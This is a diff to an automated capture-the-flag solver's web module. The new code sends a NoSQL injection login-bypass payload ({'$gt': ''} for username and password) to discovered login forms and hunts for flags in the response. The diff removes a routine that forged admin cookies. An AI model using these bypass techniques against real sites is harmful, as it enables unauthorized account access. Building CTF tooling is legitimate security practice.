@@ -15,7 +15,7 @@ import units
 import traceback
 
 potential_username_variables = [
-			'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
+	'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
 ]
 potential_password_variables = [
 	'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
@@ -23,10 +23,6 @@ potential_password_variables = [
 
 user_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_username_variables)
 pass_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_password_variables)
-
-potential_cookie_names = [ 'admin', 'is_admin', 'isadmin', 'administrator', 'isAdmin' ]
-
-
 
 class Unit(units.web.WebUnit):
 
@@ -38,7 +34,8 @@ class Unit(units.web.WebUnit):
 			raise units.NotApplicable
 
 		try:
-			self.response = requests.get(self.target)
+			self.session = requests.Session()
+			self.response = self.session.get(self.target)
 		except requests.exceptions.ConnectionError:
 			raise units.NotApplicable
 
@@ -60,21 +57,18 @@ class Unit(units.web.WebUnit):
 			if self.username: username = self.username[0]
 			if self.password: password = self.password[0]
 
-			s = requests.Session()
 			try:
-				r = s.request(method.lower(), self.target.rstrip('/') + '/' + action, data = { username: "anything", password : "anything"})
+				
+				r = self.session.request(method.lower(), self.target.rstrip('/') + '/' + action.lstrip('.').lstrip('/'), json = {
+					"username" : { "$gt":"" },
+					"password" : { "$gt":"" },
+				})
+				
+				# Hunt for flags if we have a successful injection!
+				katana.locate_flags(self, r.text)
 			except:
 				# JOHN: Theoretically, if we find a valid method, this should not error...
 				#       But if it does, we should see it.
 				traceback.print_exc()
 			
-			# Check out the cookies. Flip them if they are boolean, look for flags.
-			if s.cookies:
-				for admin_cookie in potential_cookie_names:
-					if admin_cookie in s.cookies.keys():
-						if s.cookies[admin_cookie] == 'False':
-							new = requests.get(r.url, cookies = { admin_cookie : 'True' })
-							if katana.locate_flags(self, new.text): break
-						else:
-							new = requests.get(r.url, cookies = { admin_cookie : '1' })
-							if katana.locate_flags(self, new.text): break
+			
